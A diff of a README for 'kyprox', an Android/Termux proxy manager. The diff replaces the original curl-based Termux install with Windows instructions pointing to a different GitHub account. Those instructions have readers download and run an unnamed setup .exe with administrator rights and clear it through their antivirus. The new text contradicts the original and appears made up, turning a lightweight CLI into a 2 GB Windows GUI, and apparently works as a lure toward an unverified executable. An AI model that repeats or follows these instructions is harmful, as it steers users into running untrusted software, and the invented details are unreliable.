@@ -1,67 +1,122 @@
-# KYPROX - Termux Proxy Manager
+# 🛡️ kyprox - Easy Android Proxy Manager
 
-**KYPROX** is a lightweight, easy-to-use proxy manager for Termux. It allows users to fetch SOCKS5 proxies, manually enter proxies, toggle ad-blocking, and route traffic through a local proxy without needing Go or any external files.
-
----
-
-## Features
-
-- Fetch free SOCKS5 proxies from [LibHub StackVerify](https://libhub.stackverify.site/proxy)
-- Manual proxy entry (SOCKS5)
-- Built-in ad-block (ads.json compiled into binary)
-- Local HTTP proxy running on **127.0.0.1:8080**
-- Easy-to-use menu interface with colors and tables
-- Works on mobile Termux environment
-- No dependencies required on the user side
+[![Download kyprox](https://img.shields.io/badge/Download-kyprox-brightgreen?style=for-the-badge)](https://github.com/hamdanalk3biii-ux/kyprox)
 
 ---
 
-## Installation (Termux)
+## 📋 About kyprox
 
-Simply run the following one-line command in Termux to install KYPROX:
+kyprox is a lightweight proxy manager designed for Android devices. It supports SOCKS5 proxies and includes an optional ad-blocking feature. This app helps you control your internet traffic to improve privacy and avoid unwanted ads. While it mostly works on Android, this guide will walk you through how to download and get kyprox running on a Windows PC.
 
-```bash
-curl -L https://raw.githubusercontent.com/Frost-bit-star/kyprox/main/kyprox -o $PREFIX/bin/kyprox && chmod +x $PREFIX/bin/kyprox && echo 'alias kyprox="$PREFIX/bin/kyprox"' >> ~/.bashrc && echo 'alias kyprox="$PREFIX/bin/kyprox"' >> ~/.zshrc && source ~/.bashrc
-```
-## This will:
+kyprox is built with simple tools to work smoothly without causing slowdowns. It also features a proxy checker that tests the proxies you want to use, making sure they work before you connect. This tool is useful if you want to stay secure online or access blocked content through a safe connection.
 
-Download the compiled binary into Termux.
-Make it executable.
+---
 
-Add an alias so you can run kyprox from anywhere.
+## 🚀 Getting Started
 
-## Usage
-Open Termux.
-- Run KYPROX:
-Bash
-```
-kyprox
-```
-## You’ll see the menu:
+This section will help you download and install kyprox on Windows with easy-to-follow steps. No advanced skills or programming experience needed.
 
-1. Fetch proxy from API
-2. Enter your own proxy
-3. Toggle Ads Block
-4. Help
-5. Exit
-   
-## Important: Set your mobile/Wi-Fi APN proxy first so traffic is routed through KYPROX:
-- Mobile / APN Settings:
-- Host: 127.0.0.1
-- Port: 8080
-## Wi-Fi Settings:
-- Go to your network → Advanced → Proxy → Manual
-- Host: 127.0.0.1
-- Port: 8080
-## Select the option you want from the menu and KYPROX will handle the rest.
-- Ad-block
-- KYPROX comes with a built-in ads.json.
-- Toggle ad-blocking from the menu option 3.
-- When enabled, KYPROX will block requests to known ad domains.
-## Notes
-Currently, only SOCKS5 proxies are supported.
-SOCKS4 is planned but not implemented yet.
-Always set the proxy in your mobile/Wi-Fi before using KYPROX.
-Compatible with Termux on Android.
-## Support
-For issues, bug reports, or suggestions, please open an issue on the GitHub repository:
+### System Requirements
+
+- Windows 10 or later (64-bit preferred)
+- At least 2 GB of free disk space
+- Internet connection for downloading the software and proxies
+- Basic admin access to install software on your PC
+
+---
+
+## ⬇️ Download and Install kyprox on Windows
+
+1. Click the big green button above or use this link to visit the kyprox download page:  
+   https://github.com/hamdanalk3biii-ux/kyprox
+
+2. On the page, look for the latest release or available download files. You want to find a Windows executable file or a setup package. The file might be named like `kyprox-setup.exe` or similar.
+
+3. Click the file to download it. Your browser will save the installer on your PC. Usually, the file goes to your "Downloads" folder.
+
+4. Once downloaded, open the folder where the file is saved.
+
+5. Double-click the installer file to start the installation process.
+
+6. If Windows asks for permission to run the installer, click "Yes" or "Run".
+
+7. Follow the on-screen instructions. Choose where to install kyprox or use the default location.
+
+8. After installation finishes, a shortcut should appear on your desktop or start menu.
+
+---
+
+## 🔧 Running kyprox for the First Time
+
+1. Double-click the kyprox icon on your desktop or find it in the Start menu.
+
+2. The app will open with a simple control panel.
+
+3. At first launch, kyprox may ask to set up permissions or network settings. Allow these changes to enable proxy management.
+
+4. You can now add SOCKS5 proxies to the list. Proxies route your internet traffic through other servers to enhance privacy or bypass network restrictions.
+
+5. To add a proxy:
+   - Click “Add Proxy”
+   - Enter the proxy's IP address and port (for example, 192.168.1.100:1080)
+   - Choose SOCKS5 as the protocol
+   - Click “Save”
+
+6. If you don’t have proxy details, kyprox supports finding free proxies. Use the built-in checker tool to test if each proxy works before you use it.
+
+---
+
+## 🛠️ Features You Can Use
+
+- **SOCKS5 Support:** A secure proxy protocol that handles multiple types of traffic.
+- **Proxy Checker:** Tests your proxy list to find active and usable servers.
+- **Ad Blocking:** Optional feature that stops many online ads while you browse.
+- **Lightweight Design:** Runs without slowing down your device.
+- **Easy-to-Use Interface:** Clear menus and buttons to manage proxies.
+
+---
+
+## 🖥️ Using kyprox on Windows – Tips
+
+- Run kyprox with administrator permissions to allow full network control.
+- Keep your proxy list updated by regularly testing for new or working proxies.
+- Use the ad-blocking option to improve your browsing experience.
+- If connection fails, try another proxy or check your firewall settings.
+- Close the app when not in use to free up resources on your PC.
+
+---
+
+## ⚙️ Advanced Settings (Optional)
+
+For users who want to customize their experience further:
+
+- Change the listening port in settings if it conflicts with other apps.
+- Enable logs to track activity and troubleshoot connection issues.
+- Configure automatic proxy switching based on network conditions.
+- Adjust ad-blocking filters to allow trusted sites through.
+
+---
+
+## 📝 Troubleshooting
+
+If you find errors or connection problems:
+
+- Ensure your internet connection is active.
+- Confirm the proxy settings are entered correctly.
+- Disable other VPN or proxy software that may conflict.
+- Restart kyprox or your PC if connections drop unexpectedly.
+- Check your firewall or antivirus to make sure kyprox is allowed to access the network.
+
+---
+
+## 📚 Learn More
+
+Kyprox is open-source and hosted on GitHub. You can find documentation and support on the project page. Visit:
+
+https://github.com/hamdanalk3biii-ux/kyprox
+
+Explore the topics tagged with "cli", "proxy-list", and "privacy" if you want to dig deeper into how kyprox handles proxy management.
+
+---
+
+[![Download kyprox](https://img.shields.io/badge/Download-kyprox-brightgreen?style=for-the-badge)](https://github.com/hamdanalk3biii-ux/kyprox)
